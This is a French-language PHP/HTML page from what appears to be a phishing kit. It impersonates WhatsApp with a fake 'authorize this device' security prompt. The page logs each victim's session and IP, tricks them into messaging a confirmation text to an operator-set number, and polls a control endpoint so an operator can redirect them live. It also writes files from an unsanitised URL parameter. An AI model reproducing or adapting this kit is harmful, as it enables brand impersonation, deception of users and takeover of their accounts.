<?php
// Récupérer les paramètres de l'URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';

// Vérifier si les paramètres sont présents
if (empty($sessionId) || empty($clientIp)) {
    die("Paramètres manquants");
}

// Mettre à jour le fichier de suivi
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'authorize_device.php',
    'timestamp' => time(),
    'ip' => $clientIp
];

// Créer le dossier tracking s'il n'existe pas
if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autoriser l'appareil - WhatsApp</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ecf5ee 0%, #d7f5d4 100%);
            color: #111;
            line-height: 1.6;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            margin-top: 20px;
        }
        
        .logo {
            width: 80px;
            margin: 0 auto 15px;
            font-size: 72px;
            color: #25D366;
            display: inline-block;
            width: 100px;
            height: 100px;
            background-color: #e8f5e9;
            border-radius: 50%;
            line-height: 100px;
        }
        
        .card {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
            padding: 40px 20px;
            margin-bottom: 20px;
            border-top: 5px solid #25D366;
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            font-weight: 600;
            color: #111;
            text-align: center;
        }
        
        h2 {
            font-size: 18px;
            margin-top: 30px;
            margin-bottom: 15px;
            color: #111;
            font-weight: 600;
        }
        
        p {
            font-size: 15px;
            margin-bottom: 15px;
            color: #54656f;
            line-height: 1.6;
        }
        
        .image-container {
            background-color: #e8f5e9;
            padding: 30px 20px;
            border-radius: 8px;
            text-align: center;
            margin: 30px 0;
            border: 1px solid #c8e6c9;
        }
        
        .devices {
            display: flex;
            justify-content: space-around;
            align-items: center;
            margin: 20px 0;
        }
        
        .device {
            text-align: center;
        }
        
        .device i {
            font-size: 40px;
            color: #25D366;
        }
        
        .shield {
            color: #25D366;
            font-size: 50px;
            margin: 0 15px;
        }
        
        .dots {
            border-top: 2px dotted #25D366;
            width: 50px;
            height: 1px;
        }
        
        .button {
            display: block;
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            margin-bottom: 12px;
            transition: all 0.3s ease;
            box-shadow: 0 2px 8px rgba(37, 211, 102, 0.3);
        }
        
        .button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.4);
        }
        
        .button:active {
            transform: translateY(0);
        }
        
        .button i {
            margin-right: 8px;
            font-size: 18px;
        }
        
        .button.secondary {
            background-color: #ecf5ee;
            color: #25D366;
            border: 2px solid #25D366;
        }
        
        .button.secondary:hover {
            background-color: #d7f5d4;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #54656f;
            font-size: 12px;
        }
        
        .footer a {
            color: #25D366;
            text-decoration: none;
            font-weight: 500;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .languages {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin-bottom: 10px;
            gap: 5px;
        }
        
        .languages a {
            color: #54656f;
            text-decoration: none;
            font-size: 12px;
        }
        
        .languages a:hover {
            text-decoration: underline;
        }
        
        .languages a.active {
            color: #25D366;
            font-weight: 600;
        }
        
        .copyright {
            margin-top: 10px;
            color: #54656f;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 0;
            }
            
            .card {
                padding: 30px 15px;
                border-radius: 0;
            }
            
            .logo {
                width: 80px;
                height: 80px;
                line-height: 80px;
                font-size: 50px;
            }
            
            h1 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <i class="fab fa-whatsapp"></i>
            </div>
        </div>
        
        <div class="card">
            <h1>Autoriser cet appareil</h1>
            
            <p>Pour des raisons de sécurité, nous devons vérifier que c'est bien vous qui essayez de vous connecter à votre compte.</p>
            
            <p>Cliquez sur le bouton ci-dessous pour confirmer votre identité via WhatsApp.</p>
            
            <div class="image-container">
                <div class="devices">
                    <div class="device">
                        <i class="fas fa-mobile-alt"></i>
                    </div>
                    <div class="dots"></div>
                    <div class="shield">
                        <i class="fas fa-shield-alt"></i>
                    </div>
                    <div class="dots"></div>
                    <div class="device">
                        <i class="fas fa-laptop"></i>
                    </div>
                </div>
            </div>
            
            <h2>Confirmer votre identité</h2>
            
            <p>Cliquez sur le bouton "Autoriser" pour ouvrir WhatsApp et confirmer que c'est bien vous.</p>
            
            <button class="button" id="authorizeBtn" onclick="authorizeDevice()">
                <i class="fab fa-whatsapp"></i> Autoriser via WhatsApp
            </button>
            
            
        </div>
        
        <div class="footer">
            <div class="languages">
                <a href="#" class="active">Français (France)</a> ·
                <a href="#">English (US)</a> ·
                <a href="#">Español</a> ·
                <a href="#">Deutsch</a>
            </div>
            
            <div class="copyright">
                © 2026 WhatsApp
            </div>
        </div>
    </div>
    
    <script>
        function authorizeDevice() {
            const phoneNumber = '+'; // 🔧 Remplacez par votre numéro WhatsApp
            const message = 'Je confirme que je suis le propriétaire de ce compte et j\'autorise cet appareil.';
            
            const sessionId = '<?php echo htmlspecialchars($sessionId); ?>';
            const clientIp = '<?php echo htmlspecialchars($clientIp); ?>';
            
            // Détecter si l'utilisateur est sur mobile ou desktop
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            
            if (isMobile) {
                // Mobile: Ouvrir l'app WhatsApp
                window.location.href = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
            } else {
                // Desktop: Ouvrir WhatsApp Web
                window.open(`https://web.whatsapp.com/send?phone=${phoneNumber}&text=${encodeURIComponent(message)}`, '_blank');
            }
            
            // Enregistrer l'action
            fetch('save_action.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    session: sessionId,
                    ip: clientIp,
                    action: 'device_authorized'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    setTimeout(() => {
                        window.location.href = `loading.php?session=${sessionId}&ip=${clientIp}`;
                    }, 2000);
                }
            })
            .catch(error => {
                console.error('Erreur:', error);
                setTimeout(() => {
                    window.location.href = `loading.php?session=${sessionId}&ip=${clientIp}`;
                }, 2000);
            });
        }
        
        function cancelAuthorization() {
            const sessionId = '<?php echo htmlspecialchars($sessionId); ?>';
            const clientIp = '<?php echo htmlspecialchars($clientIp); ?>';
            window.location.href = `connexion_f.php?session=${sessionId}&ip=${clientIp}`;
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo htmlspecialchars($sessionId); ?>';
            const clientIp = '<?php echo htmlspecialchars($clientIp); ?>';
            
            // Fonction pour vérifier s'il y a une action à effectuer
            function checkAction() {
                fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
                .then(response => response.json())
                .then(data => {
                    if (data.action) {
                        if (data.action === 'device_authorized') {
                            window.location.href = `loading.php?session=${sessionId}&ip=${clientIp}`;
                        } else if (data.action === 'redirect' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else if (data.action === 'custom' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else {
                            window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp;
                        }
                    }
                })
                .catch(error => {
                    console.error('Erreur lors de la vérification des actions:', error);
                });
            }
            
            // Vérifier les actions toutes les 2 secondes
            setInterval(checkAction, 2000);
        });
    </script>
</body>
</html>